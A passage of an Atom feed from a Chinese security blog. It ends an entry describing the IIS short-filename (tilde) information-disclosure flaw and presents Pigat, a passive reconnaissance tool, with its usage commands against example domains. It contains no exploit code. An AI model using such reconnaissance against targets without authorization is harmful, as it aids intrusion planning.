      &lt;h1 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h1&gt;&lt;p&gt;漏洞名称：IIS短文件名泄露&lt;/p&gt;
&lt;p&gt;风险等级：低&lt;/p&gt;
&lt;p&gt;问题类型：信息泄露&lt;/p&gt;
&lt;h1 id=&quot;0x01-漏洞描述&quot;&gt;&lt;a href=&quot;#0x01-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞描述&quot;&gt;&lt;/a&gt;0x01 漏洞描述&lt;/h1&gt;&lt;p&gt;此漏洞实际是由HTTP请求中旧DOS 8.3名称约定（SFN）的代字符（〜）波浪号引起的。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
      <category term="IIS" scheme="https://www.teamssix.com/tags/IIS/"/>
    
      <category term="信息泄露" scheme="https://www.teamssix.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>Pigat：一款被动信息收集聚合工具</title>
    <link href="https://www.teamssix.com/year/191126-215759.html"/>
    <id>https://www.teamssix.com/year/191126-215759.html</id>
    <published>2019-11-26T13:57:59.000Z</published>
    <updated>2019-11-26T14:49:26.511Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Pigat即Passive Intelligence Gathering Aggregation Tool，翻译过来就是被动信息收集聚合工具，既然叫聚合工具，也就是说该工具将多款被动信息收集工具结合在了一起，进而提高了平时信息收集的效率。</p><p>早在一个月前便萌生了开发这个工具的想法，但是一直没有时间，正好最近有时间了，就简单写一下。</p><a id="more"></a><p>因为我没有太多的开发经验，所以这款工具难免存在需要改进的地方，因此希望各位大佬能够多多反馈这款工具存在的问题，一起完善这个工具。</p><h1 id="0x01-工具原理及功能概述"><a href="#0x01-工具原理及功能概述" class="headerlink" title="0x01 工具原理及功能概述"></a>0x01 工具原理及功能概述</h1><p>这款工具的原理很简单，用户输入目标url，再利用爬虫获取相关被动信息收集网站关于该url的信息，最后回显出来。</p><p>目前该工具具备8个功能，原该工具具备7个功能，分别为收集目标的资产信息、CMS信息、DNS信息、备案信息、IP地址、子域名信息、whois信息，现加入第8个功能：如果在程序中两次IP查询目标URL的结果一致，那么查询该IP的端口，即端口查询功能。</p><h1 id="0x02-工具简单上手使用"><a href="#0x02-工具简单上手使用" class="headerlink" title="0x02 工具简单上手使用"></a>0x02 工具简单上手使用</h1><h2 id="1、查看帮助信息"><a href="#1、查看帮助信息" class="headerlink" title="1、查看帮助信息"></a>1、查看帮助信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># python pigat.py -h</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/pigat1.png" alt></p><h2 id="2、指定url进行信息获取"><a href="#2、指定url进行信息获取" class="headerlink" title="2、指定url进行信息获取"></a>2、指定url进行信息获取</h2><p>如果只指定url这一个参数，没有指定其他参数，则默认获取该url的所有信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># python pigat.py -u teamssix.com</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/pigat2.png" alt></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/pigat3.png" alt></p><h2 id="3、指定url进行单项信息获取"><a href="#3、指定url进行单项信息获取" class="headerlink" title="3、指定url进行单项信息获取"></a>3、指定url进行单项信息获取</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># python pigat.py -u baidu.com --assert</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/pigat4.png" alt></p><h2 id="4、指定url进行多项信息获取"><a href="#4、指定url进行多项信息获取" class="headerlink" title="4、指定url进行多项信息获取"></a>4、指定url进行多项信息获取</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># python pigat.py -u teamssix.com --ip --cms</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/pigat5.png" alt></p><h1 id="0x03-工具获取"><a href="#0x03-工具获取" class="headerlink" title="0x03 工具获取"></a>0x03 工具获取</h1><p>关于此工具的下载地址可在我的个人公众号（TeamsSix）回复”pigat”获取。</p><h1 id="0x04-声明"><a href="#0x04-声明" class="headerlink" title="0x04 声明"></a>0x04 声明</h1><p>1、本文在FreeBuf首发，原文地址在文章尾部</p><p>2、由于我的个人疏忽，导致在FreeBuf文中获取工具的方式存在错误的地方，正确的获取方式应是回复”pigat”，而不是”pigta”，这就导致不少人及时回复了关键词也没有获取到工具地址，在这里表示深刻歉意，现在公众号后台规则已经更新，上述两个关键词均可以获取到工具地址。</p><blockquote><p>原文地址：<a href="https://www.freebuf.com/sectool/219681.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/219681.html</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;Pigat即Passive Intelligence Gathering Aggregation Tool，翻译过来就是被动信息收集聚合工具，既然叫聚合工具，也就是说该工具将多款被动信息收集工具结合在了一起，进而提高了平时信息收集的效率。&lt;/p&gt;
&lt;p&gt;早在一个月前便萌生了开发这个工具的想法，但是一直没有时间，正好最近有时间了，就简单写一下。&lt;/p&gt;
    
    </summary>
    
      <category term="工具使用" scheme="https://www.teamssix.com/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
      <category term="被动信息收集" scheme="https://www.teamssix.com/tags/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
      <category term="pigat" scheme="https://www.teamssix.com/tags/pigat/"/>
    
      <category term="聚合工具" scheme="https://www.teamssix.com/tags/%E8%81%9A%E5%90%88%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
</feed>
